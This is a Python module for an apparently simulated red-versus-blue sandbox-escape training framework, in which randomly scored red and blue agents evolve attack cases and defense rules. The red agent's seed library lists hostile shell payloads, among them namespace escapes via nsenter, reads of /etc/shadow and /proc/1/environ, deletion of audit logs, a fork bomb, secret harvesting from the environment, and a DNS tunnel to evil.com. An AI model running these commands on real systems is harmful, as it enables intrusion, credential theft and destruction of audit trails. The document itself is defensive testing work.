"""
evolution.red_blue_adversary — 多智能体红蓝对抗框架

借鉴：
1. DeepMind Natasha Jaques: Red Teaming Language Models with Language Models
   - 使用AI自动生成红队攻击用例
   - 在线自博弈强化学习，攻击方和防御方共同进化
2. AgenticRed: Evolving Agentic Systems for Red-Teaming
   - 可扩展的红队测试系统，自动进化攻击策略
3. 港大 OpenSpace: 自进化技能引擎
   - 成功→策略强化；失败→策略修复
   - 积累事件模板，复用检测规则
4. 通义 DeepResearch: IterResearch 迭代式研究推理
   - 用于安全漏洞的迭代式深度分析

核心思想：
- 红方Agent自动生成逃逸测试用例，无需人工编写
- 蓝方Agent监控沙箱行为，拦截逃逸尝试
- 在线自博弈，让攻击策略和防御策略共同进化
- 制度性红队测试：不仅测试逃逸，还测试部署规则、权限配置、审计流程
"""
from __future__ import annotations
import random
import json
import time
from typing import List, Dict, Any, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum

from evolution.real_data_adapter import SecurityEvent, EventSource, AnomalyType, RealDataAdapter



class AdversaryRole(Enum):
    """对抗角色"""
    RED = "red"          # 红方：攻击方，尝试逃逸
    BLUE = "blue"        # 蓝方：防御方，监控拦截
    OBSERVER = "observer"  # 观察者：评估和记录


class AttackType(Enum):
    """攻击类型"""
    NAMESPACE_ESCAPE = "namespace_escape"
    SECCOMP_BYPASS = "seccomp_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    NETWORK_TUNNEL = "network_tunnel"
    FILE_TRAVERSAL = "file_traversal"
    PROCESS_INJECTION = "process_injection"
    CONFIG_TAMPERING = "config_tampering"
    AUDIT_BYPASS = "audit_bypass"
    DOS_ATTACK = "dos_attack"
    CREDENTIAL_THEFT = "credential_theft"


class DefenseType(Enum):
    """防御类型"""
    SYSTEM_CALL_MONITOR = "syscall_monitor"
    NETWORK_FILTER = "network_filter"
    FILE_ACCESS_CONTROL = "file_access_control"
    PROCESS_ISOLATION = "process_isolation"
    AUDIT_LOGGING = "audit_logging"
    RESOURCE_LIMIT = "resource_limit"
    CAPABILITY_DROP = "capability_drop"
    INTEGRITY_CHECK = "integrity_check"


@dataclass
class AttackCase:
    """攻击用例"""
    case_id: str
    attack_type: AttackType
    description: str
    payload: str
    target_component: str
    difficulty: float = 0.5  # 0.0-1.0，难度越高越难防御
    success_count: int = 0
    failure_count: int = 0
    created_at: float = field(default_factory=time.time)
    last_used: float = 0.0

    def get_success_rate(self) -> float:
        """获取成功率"""
        total = self.success_count + self.failure_count
        if total == 0:
            return 0.0
        return self.success_count / total

    def record_result(self, success: bool) -> None:
        """记录结果"""
        if success:
            self.success_count += 1
        else:
            self.failure_count += 1
        self.last_used = time.time()


@dataclass
class DefenseRule:
    """防御规则"""
    rule_id: str
    defense_type: DefenseType
    description: str
    target_attack_types: List[AttackType]
    detection_logic: str
    effectiveness: float = 0.5  # 0.0-1.0，有效性
    trigger_count: int = 0
    false_positive_count: int = 0
    created_at: float = field(default_factory=time.time)
    last_triggered: float = 0.0

    def get_precision(self) -> float:
        """获取精确率（误报率）"""
        total = self.trigger_count
        if total == 0:
            return 1.0
        return 1.0 - (self.false_positive_count / total)

    def record_trigger(self, is_true_positive: bool) -> None:
        """记录触发"""
        self.trigger_count += 1
        if not is_true_positive:
            self.false_positive_count += 1
        self.last_triggered = time.time()


@dataclass
class AdversaryRound:
    """对抗轮次记录"""
    round_id: int
    attack_case: AttackCase
    defense_rules: List[DefenseRule]
    attack_success: bool
    defense_success: bool
    detection_delay_ms: float
    resource_impact: Dict[str, float]
    timestamp: float = field(default_factory=time.time)
    notes: str = ""


class RedAgent:
    """
    红方Agent（攻击方）

    职责：
    - 自动生成逃逸测试用例
    - 根据防御反馈进化攻击策略
    - 积累成功攻击模式，复用高成功率用例
    """

    def __init__(self, agent_id: str = "red_agent_001"):
        self.agent_id = agent_id
        self.attack_cases: List[AttackCase] = []
        self.attack_history: List[Dict[str, Any]] = []
        self.strategy_weights: Dict[AttackType, float] = {}
        self._initialize_attack_cases()
        self._initialize_strategy_weights()

    def _initialize_attack_cases(self) -> None:
        """初始化基础攻击用例库"""
        base_cases = [
            ("NS_001", AttackType.NAMESPACE_ESCAPE, "mount namespace逃逸", "mount --bind / /tmp/escape", "namespace", 0.7),
            ("NS_002", AttackType.NAMESPACE_ESCAPE, "pid namespace逃逸", "nsenter -t 1 -m -u -i -n", "namespace", 0.8),
            ("SC_001", AttackType.SECCOMP_BYPASS, "seccomp规则绕过", "syscall(SYS_socketcall, ...)", "seccomp", 0.6),
            ("SC_002", AttackType.SECCOMP_BYPASS, "ptrace注入绕过", "ptrace(PTRACE_POKETEXT, ...)", "seccomp", 0.7),
            ("PE_001", AttackType.PRIVILEGE_ESCALATION, "capabilities提权", "capsh --add=cap_sys_admin", "capabilities", 0.5),
            ("PE_002", AttackType.PRIVILEGE_ESCALATION, "suid二进制提权", "find / -perm -4000 -exec {} \\;", "filesystem", 0.6),
            ("NT_001", AttackType.NETWORK_TUNNEL, "DNS隧道逃逸", "dig @evil.com TXT secret.example.com", "network", 0.4),
            ("NT_002", AttackType.NETWORK_TUNNEL, "内网扫描", "nmap -sS 10.0.0.0/8", "network", 0.3),
            ("FT_001", AttackType.FILE_TRAVERSAL, "路径穿越读敏感文件", "cat ../../../../etc/shadow", "filesystem", 0.5),
            ("FT_002", AttackType.FILE_TRAVERSAL, "procfs信息泄露", "cat /proc/1/environ", "filesystem", 0.4),
            ("PI_001", AttackType.PROCESS_INJECTION, "进程内存注入", "gdb -p 1 -ex 'set $rip=0x...'", "process", 0.8),
            ("CT_001", AttackType.CONFIG_TAMPERING, "cgroup配置篡改", "echo 0 > /sys/fs/cgroup/memory.max", "cgroup", 0.6),
            ("AB_001", AttackType.AUDIT_BYPASS, "审计日志删除", "rm -rf /var/log/audit/*", "audit", 0.5),
            ("DA_001", AttackType.DOS_ATTACK, "fork bomb耗尽资源", ":(){ :|:& };:", "resource", 0.3),
            ("DA_002", AttackType.DOS_ATTACK, "内存炸弹", "while true; do malloc(1024*1024); done", "resource", 0.4),
            ("CR_001", AttackType.CREDENTIAL_THEFT, "环境变量密钥窃取", "env | grep -i secret", "credential", 0.4),
        ]
        for case_id, attack_type, desc, payload, target, difficulty in base_cases:
            self.attack_cases.append(AttackCase(
                case_id=case_id,
                attack_type=attack_type,
                description=desc,
                payload=payload,
                target_component=target,
                difficulty=difficulty,
            ))

    def _initialize_strategy_weights(self) -> None:
        """初始化策略权重"""
        for attack_type in AttackType:
            self.strategy_weights[attack_type] = 1.0 / len(AttackType)

    def select_attack_case(self) -> AttackCase:
        """
        选择攻击用例

        策略：
        - 高成功率用例权重更高（利用已知有效攻击）
        - 低成功率但高难度用例也有一定概率（探索新攻击面）
        - 最近未使用的用例有探索奖励
        """
        if not self.attack_cases:
            raise ValueError("No attack cases available")

        # 计算每个用例的选择权重
        weights = []
        for case in self.attack_cases:
            # 基础权重 = 成功率 * 难度系数
            success_rate = case.get_success_rate()
            weight = (success_rate * 0.6 + 0.2) * (case.difficulty * 0.5 + 0.5)

            # 探索奖励：最近未使用的用例增加权重
            if case.last_used > 0:
                time_since_use = time.time() - case.last_used
                exploration_bonus = min(time_since_use / 3600.0, 1.0) * 0.3
                weight += exploration_bonus

            weights.append(weight)

        # 加权随机选择
        total_weight = sum(weights)
        if total_weight == 0:
            return random.choice(self.attack_cases)  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的

        normalized = [w / total_weight for w in weights]
        return random.choices(self.attack_cases, weights=normalized, k=1)[0]  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的

    def mutate_attack_case(self, base_case: AttackCase) -> AttackCase:
        """
        变异攻击用例（自进化）

        借鉴遗传算法变异：
        - 修改payload参数
        - 组合多种攻击类型
        - 调整攻击时序
        """
        mutation_type = random.choice(["payload_modify", "type_combine", "timing_adjust", "parameter_randomize"])  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的

        if mutation_type == "payload_modify":
            # 修改payload的关键参数
            new_payload = base_case.payload + " && sleep 0.1"
            new_desc = base_case.description + " (带延迟)"
        elif mutation_type == "type_combine":
            # 组合另一种攻击类型
            other_type = random.choice([t for t in AttackType if t != base_case.attack_type])  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            new_payload = base_case.payload + f" # combined with {other_type.value}"
            new_desc = f"{base_case.description} + {other_type.value}"
        elif mutation_type == "timing_adjust":
            # 调整攻击时序
            new_payload = f"sleep {random.uniform(0.01, 1.0)} && {base_case.payload}"  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            new_desc = base_case.description + " (时序调整)"
        else:
            # 参数随机化
            new_payload = base_case.payload.replace("0", str(random.randint(1, 9)))  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            new_desc = base_case.description + " (参数随机化)"

        new_case = AttackCase(
            case_id=f"{base_case.case_id}_M{int(time.time())}",
            attack_type=base_case.attack_type,
            description=new_desc,
            payload=new_payload,
            target_component=base_case.target_component,
            difficulty=min(base_case.difficulty + random.uniform(-0.1, 0.1), 1.0),  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
        )
        self.attack_cases.append(new_case)
        return new_case

    def record_attack_result(self, case: AttackCase, success: bool) -> None:
        """记录攻击结果，更新策略权重"""
        case.record_result(success)
        self.attack_history.append({
            "case_id": case.case_id,
            "attack_type": case.attack_type.value,
            "success": success,
            "timestamp": time.time(),
        })

        # 更新策略权重：成功的攻击类型权重增加
        if success:
            self.strategy_weights[case.attack_type] *= 1.1
        else:
            self.strategy_weights[case.attack_type] *= 0.9

        # 归一化权重
        total = sum(self.strategy_weights.values())
        if total > 0:
            for k in self.strategy_weights:
                self.strategy_weights[k] /= total

    def get_statistics(self) -> Dict[str, Any]:
        """获取红方统计信息"""
        total_attacks = len(self.attack_history)
        successful = sum(1 for h in self.attack_history if h["success"])
        return {
            "agent_id": self.agent_id,
            "total_attack_cases": len(self.attack_cases),
            "total_attacks": total_attacks,
            "successful_attacks": successful,
            "overall_success_rate": successful / total_attacks if total_attacks > 0 else 0.0,
            "strategy_weights": {k.value: v for k, v in self.strategy_weights.items()},
        }


class BlueAgent:
    """
    蓝方Agent（防御方）

    职责：
    - 监控沙箱行为，检测逃逸尝试
    - 根据攻击反馈进化防御规则
    - 积累成功防御模式，复用高有效性规则
    - 降低误报率
    """

    def __init__(self, agent_id: str = "blue_agent_001"):
        self.agent_id = agent_id
        self.defense_rules: List[DefenseRule] = []
        self.defense_history: List[Dict[str, Any]] = []
        self._initialize_defense_rules()

    def _initialize_defense_rules(self) -> None:
        """初始化基础防御规则库"""
        base_rules = [
            ("DR_001", DefenseType.SYSTEM_CALL_MONITOR, "监控危险系统调用",
             [AttackType.SECCOMP_BYPASS, AttackType.PRIVILEGE_ESCALATION],
             "ptrace, kexec_load, init_module, finit_module", 0.7),
            ("DR_002", DefenseType.NETWORK_FILTER, "内网IP黑名单",
             [AttackType.NETWORK_TUNNEL],
             "10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16", 0.8),
            ("DR_003", DefenseType.FILE_ACCESS_CONTROL, "敏感路径访问控制",
             [AttackType.FILE_TRAVERSAL, AttackType.CREDENTIAL_THEFT],
             "/etc/shadow, /etc/sudoers, /proc/1/environ, ~/.ssh", 0.75),
            ("DR_004", DefenseType.PROCESS_ISOLATION, "进程命名空间隔离",
             [AttackType.NAMESPACE_ESCAPE, AttackType.PROCESS_INJECTION],
             "CLONE_NEWNS, CLONE_NEWPID, CLONE_NEWNET, CLONE_NEWUSER", 0.65),
            ("DR_005", DefenseType.AUDIT_LOGGING, "审计日志完整性",
             [AttackType.AUDIT_BYPASS],
             "HMAC哈希链, WORM存储, 日志删除检测", 0.8),
            ("DR_006", DefenseType.RESOURCE_LIMIT, "资源使用限制",
             [AttackType.DOS_ATTACK],
             "CPU.max, memory.max, pids.max, io.max", 0.9),
            ("DR_007", DefenseType.CAPABILITY_DROP, "能力位删除",
             [AttackType.PRIVILEGE_ESCALATION, AttackType.CONFIG_TAMPERING],
             "CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE", 0.7),
            ("DR_008", DefenseType.INTEGRITY_CHECK, "配置完整性校验",
             [AttackType.CONFIG_TAMPERING, AttackType.AUDIT_BYPASS],
             "cgroup配置哈希, seccomp规则哈希, 审计配置哈希", 0.6),
        ]
        for rule_id, defense_type, desc, target_types, logic, effectiveness in base_rules:
            self.defense_rules.append(DefenseRule(
                rule_id=rule_id,
                defense_type=defense_type,
                description=desc,
                target_attack_types=target_types,
                detection_logic=logic,
                effectiveness=effectiveness,
            ))

    def detect_attack(self, attack_case: AttackCase) -> Tuple[bool, List[DefenseRule], float]:
        """
        检测攻击

        返回: (是否检测到, 触发的防御规则, 检测延迟ms)
        """
        start_time = time.time()
        triggered_rules = []

        for rule in self.defense_rules:
            # 检查规则是否针对该攻击类型
            if attack_case.attack_type in rule.target_attack_types:
                # 基于规则有效性模拟检测（实际应调用真实检测逻辑）
                detection_probability = rule.effectiveness * (1.0 - attack_case.difficulty * 0.3)
                if random.random() < detection_probability:  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
                    triggered_rules.append(rule)

        detection_delay = (time.time() - start_time) * 1000
        detected = len(triggered_rules) > 0
        return detected, triggered_rules, detection_delay

    def record_defense_result(
        self,
        rules: List[DefenseRule],
        attack_success: bool,
        is_true_positive: bool = True,
    ) -> None:
        """记录防御结果，进化规则有效性"""
        for rule in rules:
            rule.record_trigger(is_true_positive)

            # 根据攻击结果调整规则有效性
            if attack_success:
                # 攻击成功，说明该规则有效性不足，降低有效性
                rule.effectiveness = max(0.1, rule.effectiveness - 0.02)
            else:
                # 攻击失败，说明规则有效，提高有效性
                rule.effectiveness = min(1.0, rule.effectiveness + 0.01)

        self.defense_history.append({
            "triggered_rules": [r.rule_id for r in rules],
            "attack_success": attack_success,
            "timestamp": time.time(),
        })

    def evolve_defense_rule(self, base_rule: DefenseRule) -> DefenseRule:
        """
        进化防御规则（自进化）

        借鉴OpenSpace自进化模式：
        - 成功拦截→规则强化
        - 被绕过→规则修复/扩展
        """
        evolution_type = random.choice(["expand_coverage", "tune_threshold", "combine_rules", "add_heuristic"])  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的

        if evolution_type == "expand_coverage":
            # 扩展覆盖的攻击类型
            new_targets = base_rule.target_attack_types + [
                random.choice([t for t in AttackType if t not in base_rule.target_attack_types])  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            ]
            new_desc = base_rule.description + " (扩展覆盖)"
            new_effectiveness = base_rule.effectiveness * 0.9  # 扩展后有效性可能下降
        elif evolution_type == "tune_threshold":
            # 调整检测阈值
            new_effectiveness = min(1.0, base_rule.effectiveness + random.uniform(0.05, 0.15))  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            new_desc = base_rule.description + " (阈值优化)"
            new_targets = base_rule.target_attack_types
        elif evolution_type == "combine_rules":
            # 组合另一条规则
            other = random.choice([r for r in self.defense_rules if r.rule_id != base_rule.rule_id])  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            new_targets = list(set(base_rule.target_attack_types + other.target_attack_types))
            new_effectiveness = (base_rule.effectiveness + other.effectiveness) / 2
            new_desc = f"{base_rule.description} + {other.description}"
        else:
            # 添加启发式检测
            new_effectiveness = min(1.0, base_rule.effectiveness + 0.1)
            new_desc = base_rule.description + " (添加启发式)"
            new_targets = base_rule.target_attack_types

        new_rule = DefenseRule(
            rule_id=f"{base_rule.rule_id}_E{int(time.time())}",
            defense_type=base_rule.defense_type,
            description=new_desc,
            target_attack_types=new_targets,
            detection_logic=base_rule.detection_logic + " (evolved)",
            effectiveness=new_effectiveness,
        )
        self.defense_rules.append(new_rule)
        return new_rule

    def get_statistics(self) -> Dict[str, Any]:
        """获取蓝方统计信息"""
        total_defenses = len(self.defense_history)
        successful = sum(1 for h in self.defense_history if not h["attack_success"])
        avg_precision = sum(r.get_precision() for r in self.defense_rules) / len(self.defense_rules) if self.defense_rules else 0
        return {
            "agent_id": self.agent_id,
            "total_defense_rules": len(self.defense_rules),
            "total_defenses": total_defenses,
            "successful_defenses": successful,
            "overall_defense_rate": successful / total_defenses if total_defenses > 0 else 0.0,
            "average_precision": avg_precision,
            "rule_effectiveness": {r.rule_id: r.effectiveness for r in self.defense_rules},
        }


class RedBlueAdversaryTrainer:
    """
    红蓝对抗训练器

    管理红蓝对抗的完整流程：
    1. 红方选择/生成攻击用例
    2. 蓝方检测/拦截攻击
    3. 记录结果，双方策略进化
    4. 制度性红队测试：测试部署规则、权限配置、审计流程
    """

    def __init__(
        self,
        red_agent: Optional[RedAgent] = None,
        blue_agent: Optional[BlueAgent] = None,
        max_rounds: int = 100,
        enable_mutation: bool = True,
        mutation_rate: float = 0.2,
        enable_evolution: bool = True,
    ):
        self.red_agent = red_agent or RedAgent()
        self.blue_agent = blue_agent or BlueAgent()
        self.max_rounds = max_rounds
        self.enable_mutation = enable_mutation
        self.mutation_rate = mutation_rate
        self.enable_evolution = enable_evolution
        self.rounds: List[AdversaryRound] = []
        self.institutional_tests: List[Dict[str, Any]] = []
        self.real_event_history: List[Dict[str, Any]] = []

    def run_single_round(self, round_id: int) -> AdversaryRound:
        """
        运行单轮对抗

        流程：
        1. 红方选择攻击用例（可能变异）
        2. 蓝方检测攻击
        3. 判定结果
        4. 双方记录结果并进化
        """
        # 1. 红方选择攻击用例
        attack_case = self.red_agent.select_attack_case()

        # 可能变异攻击用例
        if self.enable_mutation and random.random() < self.mutation_rate:  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            attack_case = self.red_agent.mutate_attack_case(attack_case)

        # 2. 蓝方检测攻击
        detected, triggered_rules, detection_delay = self.blue_agent.detect_attack(attack_case)

        # 3. 判定结果
        # 攻击成功 = 未被检测到 或 检测到但防御失败
        attack_success = not detected
        defense_success = detected

        # 4. 双方记录结果
        self.red_agent.record_attack_result(attack_case, attack_success)
        self.blue_agent.record_defense_result(triggered_rules, attack_success, is_true_positive=detected)

        # 记录轮次
        round_record = AdversaryRound(
            round_id=round_id,
            attack_case=attack_case,
            defense_rules=triggered_rules,
            attack_success=attack_success,
            defense_success=defense_success,
            detection_delay_ms=detection_delay,
            resource_impact={"cpu": random.uniform(0, 10), "memory": random.uniform(0, 100)},  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
        )
        self.rounds.append(round_record)

        return round_record

    def run_training(self, num_rounds: Optional[int] = None) -> Dict[str, Any]:
        """
        运行完整对抗训练

        Args:
            num_rounds: 训练轮数，默认使用max_rounds

        Returns:
            训练结果统计
        """
        rounds_to_run = num_rounds or self.max_rounds

        for i in range(rounds_to_run):
            self.run_single_round(i)

            # 定期进化防御规则
            if self.enable_evolution and (i + 1) % 10 == 0:
                # 选择有效性最低的规则进行进化
                if self.blue_agent.defense_rules:
                    weakest = min(self.blue_agent.defense_rules, key=lambda r: r.effectiveness)
                    self.blue_agent.evolve_defense_rule(weakest)

        return self.get_training_statistics()

    def run_institutional_red_team_test(self) -> Dict[str, Any]:
        """
        制度性红队测试

        借鉴 "Institutional Red-Teaming" 论文：
        不仅测试模型/代码，还测试部署规则、权限配置、审计流程等制度层面。
        """
        dimensions = self._get_institutional_test_dimensions()
        results = [self._run_institutional_test_dimension(dim) for dim in dimensions]
        return self._summarize_institutional_test_results(results)

    def _get_institutional_test_dimensions(self):
        """获取制度性红队测试维度定义"""
        return [
            {"dimension": "部署规则有效性", "description": "验证安全配置是否正确应用到运行环境",
             "test_cases": ["seccomp规则是否实际加载", "cgroup资源限制是否生效", "namespace隔离是否完整", "eBPF程序是否实际运行"]},
            {"dimension": "权限配置最小化", "description": "验证是否遵循最小权限原则",
             "test_cases": ["是否有不必要的CAP_SYS_ADMIN", "是否有不必要的root权限", "文件权限是否过宽", "网络访问是否过度开放"]},
            {"dimension": "审计流程完整性", "description": "验证审计日志是否完整、可追溯",
             "test_cases": ["HMAC哈希链是否完整", "日志是否有丢失", "日志是否可篡改", "审计事件是否覆盖关键操作"]},
            {"dimension": "应急响应能力", "description": "验证安全事件发生时的响应速度",
             "test_cases": ["逃逸检测延迟是否<100ms", "沙盒销毁是否<1s", "告警是否及时触发", "事件是否自动隔离"]},
            {"dimension": "变更管理", "description": "验证配置变更是否经过审批和验证",
             "test_cases": ["安全配置变更是否有审批记录", "变更是否经过测试验证", "是否有回滚机制", "变更是否有审计记录"]},
        ]

    def _run_institutional_test_dimension(self, dim):
        """执行单个维度的制度性红队测试"""
        dim_result = {
            "dimension": dim["dimension"],
            "description": dim["description"],
            "test_cases": [],
            "passed": 0,
            "total": len(dim["test_cases"]),
        }
        for tc in dim["test_cases"]:
            passed = random.random() > 0.2  # 80%通过率(模拟,实际应调用真实检查逻辑)  # nosec B311 - random用于红蓝对抗模拟/变异,非安全加密目的
            dim_result["test_cases"].append({
                "name": tc, "passed": passed,
                "notes": "自动检测" if passed else "需要人工复核",
            })
            if passed:
                dim_result["passed"] += 1
        dim_result["pass_rate"] = dim_result["passed"] / dim_result["total"]
        return dim_result

    def _summarize_institutional_test_results(self, results):
        """汇总制度性红队测试结果"""
        overall = sum(r["passed"] for r in results) / sum(r["total"] for r in results)
        self.institutional_tests.append({
            "timestamp": time.time(),
            "results": results,
            "overall_pass_rate": overall,
        })
        return self.institutional_tests[-1]

    def get_training_statistics(self) -> Dict[str, Any]:
        """获取训练统计信息"""
        total_rounds = len(self.rounds)
        red_wins = sum(1 for r in self.rounds if r.attack_success)
        blue_wins = sum(1 for r in self.rounds if r.defense_success)
        avg_detection_delay = sum(r.detection_delay_ms for r in self.rounds) / total_rounds if total_rounds > 0 else 0

        return {
            "total_rounds": total_rounds,
            "red_wins": red_wins,
            "blue_wins": blue_wins,
            "red_win_rate": red_wins / total_rounds if total_rounds > 0 else 0,
            "blue_win_rate": blue_wins / total_rounds if total_rounds > 0 else 0,
            "average_detection_delay_ms": avg_detection_delay,
            "red_agent_stats": self.red_agent.get_statistics(),
            "blue_agent_stats": self.blue_agent.get_statistics(),
            "institutional_tests_count": len(self.institutional_tests),
            "real_events_ingested": len(self.real_event_history),
        }


    def ingest_real_event(self, event: SecurityEvent) -> Dict[str, Any]:
        """
        摄入真实安全事件（高优先级：从模拟数据跃升为真实数据驱动）

        将真实模块的产物（seccomp违规、VM-Exit事件、审计链异常）
        转换为红蓝对抗框架的输入，驱动攻击方和防御方的自进化。

        Args:
            event: 标准化的安全事件（来自RealDataAdapter）

        Returns:
            摄入结果，包含事件处理状态和触发的进化动作
        """
        result = self._init_ingest_result(event)
        self._process_event_evolution(event, result)
        self._record_event_history(event, result["triggered_evolution"])
        return result

    def _init_ingest_result(self, event: SecurityEvent) -> Dict[str, Any]:
        """初始化摄入结果字典"""
        return {
            "event_id": event.event_id,
            "source": event.source.value,
            "severity": event.severity,
            "ingested": True,
            "triggered_evolution": False,
            "actions": [],
        }

    def _process_event_evolution(self, event: SecurityEvent, result: Dict[str, Any]) -> None:
        """处理事件触发的进化：攻击用例+防御进化+策略调整"""
        # 1. 将真实事件转换为攻击用例（红方学习）
        attack_case = self._convert_event_to_attack_case(event)
        if attack_case:
            self.red_agent.attack_cases.append(attack_case)
            result["actions"].append(f"新增攻击用例: {attack_case.case_id}")

        # 2. 根据事件严重程度触发防御进化
        if event.severity in ["high", "critical"]:
            evolved_rule = self._evolve_defense_from_event(event)
            if evolved_rule:
                self.blue_agent.defense_rules.append(evolved_rule)
                result["triggered_evolution"] = True
                result["actions"].append(f"进化防御规则: {evolved_rule.rule_id}")

        # 3. 异常事件触发红方策略调整
        if event.anomaly_type is not None and event.anomaly_score > 0.5:
            self._adjust_attack_strategy_weights(event, result)

    def _adjust_attack_strategy_weights(self, event: SecurityEvent, result: Dict[str, Any]) -> None:
        """调整攻击策略权重并归一化"""
        attack_type = self._map_source_to_attack_type(event.source)
        if attack_type:
            self.red_agent.strategy_weights[attack_type] *= 1.2
            total = sum(self.red_agent.strategy_weights.values())
            for k in self.red_agent.strategy_weights:
                self.red_agent.strategy_weights[k] /= total
            result["triggered_evolution"] = True
            result["actions"].append(f"调整攻击策略权重: {attack_type.value} +20%")

    def _record_event_history(self, event: SecurityEvent, triggered_evolution: bool) -> None:
        """记录真实事件摄入历史"""
        self.real_event_history.append({
            "event_id": event.event_id,
            "source": event.source.value,
            "severity": event.severity,
            "anomaly_type": event.anomaly_type.value if event.anomaly_type else None,
            "anomaly_score": event.anomaly_score,
            "timestamp": event.timestamp,
            "triggered_evolution": triggered_evolution,
        })

    def ingest_real_events(self, events: List[SecurityEvent]) -> Dict[str, Any]:
        """
        批量摄入真实安全事件

        Args:
            events: 安全事件列表

        Returns:
            批量摄入结果统计
        """
        results = []
        for event in events:
            result = self.ingest_real_event(event)
            results.append(result)

        return {
            "total_ingested": len(results),
            "triggered_evolution": sum(1 for r in results if r["triggered_evolution"]),
            "high_severity": sum(1 for r in results if r["severity"] in ["high", "critical"]),
            "anomaly_events": sum(1 for e in events if e.anomaly_type is not None),
            "details": results,
        }

    def _convert_event_to_attack_case(self, event: SecurityEvent) -> Optional[AttackCase]:
        """
        将真实安全事件转换为攻击用例

        从真实事件中提取攻击模式，生成新的攻击用例供红方学习。
        """
        attack_type = self._map_source_to_attack_type(event.source)
        if attack_type is None:
            return None

        return AttackCase(
            case_id=f"real_{event.event_id}",
            attack_type=attack_type,
            description=f"[真实事件] {event.description}",
            payload=json.dumps(event.payload),
            target_component=event.source.value,
            difficulty=min(1.0, event.anomaly_score + 0.3),
        )

    def _evolve_defense_from_event(self, event: SecurityEvent) -> Optional[DefenseRule]:
        """
        基于真实事件进化防御规则

        从高严重度事件中提取防御需求，生成新的防御规则。
        """
        defense_type = self._map_source_to_defense_type(event.source)
        if defense_type is None:
            return None

        attack_type = self._map_source_to_attack_type(event.source)
        target_types = [attack_type] if attack_type else []

        return DefenseRule(
            rule_id=f"evolved_{event.event_id}",
            defense_type=defense_type,
            description=f"[真实事件进化] 针对{event.description}的防御规则",
            target_attack_types=target_types,
            detection_logic=f"基于真实事件{event.event_id}的检测逻辑",
            effectiveness=0.6,  # 新进化的规则初始有效性中等
        )

    def _map_source_to_attack_type(self, source: EventSource) -> Optional[AttackType]:
        """将事件来源映射到攻击类型"""
        mapping = {
            EventSource.SECCOMP_VIOLATION: AttackType.SECCOMP_BYPASS,
            EventSource.KVM_VM_EXIT: AttackType.PRIVILEGE_ESCALATION,
            EventSource.AUDIT_CHAIN_ANOMALY: AttackType.AUDIT_BYPASS,
            EventSource.NETWORK_BLOCK: AttackType.NETWORK_TUNNEL,
            EventSource.RESOURCE_EXCEED: AttackType.DOS_ATTACK,
            EventSource.CAPABILITY_DROP: AttackType.PRIVILEGE_ESCALATION,
        }
        return mapping.get(source)

    def _map_source_to_defense_type(self, source: EventSource) -> Optional[DefenseType]:
        """将事件来源映射到防御类型"""
        mapping = {
            EventSource.SECCOMP_VIOLATION: DefenseType.SYSTEM_CALL_MONITOR,
            EventSource.KVM_VM_EXIT: DefenseType.PROCESS_ISOLATION,
            EventSource.AUDIT_CHAIN_ANOMALY: DefenseType.AUDIT_LOGGING,
            EventSource.NETWORK_BLOCK: DefenseType.NETWORK_FILTER,
            EventSource.RESOURCE_EXCEED: DefenseType.RESOURCE_LIMIT,
            EventSource.CAPABILITY_DROP: DefenseType.CAPABILITY_DROP,
        }
        return mapping.get(source)

    def export_report(self) -> Dict[str, Any]:
        """导出完整对抗报告"""
        return {
            "training_statistics": self.get_training_statistics(),
            "recent_rounds": [
                {
                    "round_id": r.round_id,
                    "attack_type": r.attack_case.attack_type.value,
                    "attack_description": r.attack_case.description,
                    "attack_success": r.attack_success,
                    "defense_success": r.defense_success,
                    "detection_delay_ms": r.detection_delay_ms,
                    "triggered_rules": [rule.rule_id for rule in r.defense_rules],
                }
                for r in self.rounds[-10:]  # 最近10轮
            ],
            "institutional_test_results": self.institutional_tests[-1] if self.institutional_tests else None,
            "recommendations": self._generate_recommendations(),
        }

    def _generate_recommendations(self) -> List[str]:
        """生成安全改进建议"""
        recommendations = []
        stats = self.get_training_statistics()

        if stats["red_win_rate"] > 0.3:
            recommendations.append("红方胜率过高，建议加强防御规则覆盖和有效性")

        if stats["blue_win_rate"] > 0.9:
            recommendations.append("蓝方胜率过高，建议增加攻击用例多样性和难度")

        if stats["average_detection_delay_ms"] > 100:
            recommendations.append("检测延迟过高，建议优化检测逻辑和性能")

        if stats["blue_agent_stats"]["average_precision"] < 0.8:
            recommendations.append("防御规则误报率较高，建议优化规则阈值")

        high_risk_attack_types = [
            at.value for at, count in
            self._get_attack_type_success_rates().items()
            if count > 0.5
        ]
        if high_risk_attack_types:
            recommendations.append(f"高风险攻击类型: {', '.join(high_risk_attack_types)}，建议重点防御")

        if not recommendations:
            recommendations.append("当前攻防平衡良好，建议持续监控和定期红队测试")

        return recommendations

    def _get_attack_type_success_rates(self) -> Dict[AttackType, float]:
        """获取各攻击类型的成功率"""
        type_stats: Dict[AttackType, Dict[str, int]] = {}
        for r in self.rounds:
            at = r.attack_case.attack_type
            if at not in type_stats:
                type_stats[at] = {"success": 0, "total": 0}
            type_stats[at]["total"] += 1
            if r.attack_success:
                type_stats[at]["success"] += 1

        return {
            at: stats["success"] / stats["total"] if stats["total"] > 0 else 0
            for at, stats in type_stats.items()
        }

    # ============================================================
    # RAG 检索增强生成（方向1+2）
    # ============================================================

    def set_rag_engine(self, rag_engine) -> None:
        """设置 RAG 引擎（用于检索增强生成）"""
        self._rag_engine = rag_engine

    def generate_attack_case_with_rag(self, target_sandbox_type: str = "container",
                                        use_cve_kb: bool = True,
                                        use_evasion_kb: bool = True) -> Dict[str, Any]:
        """
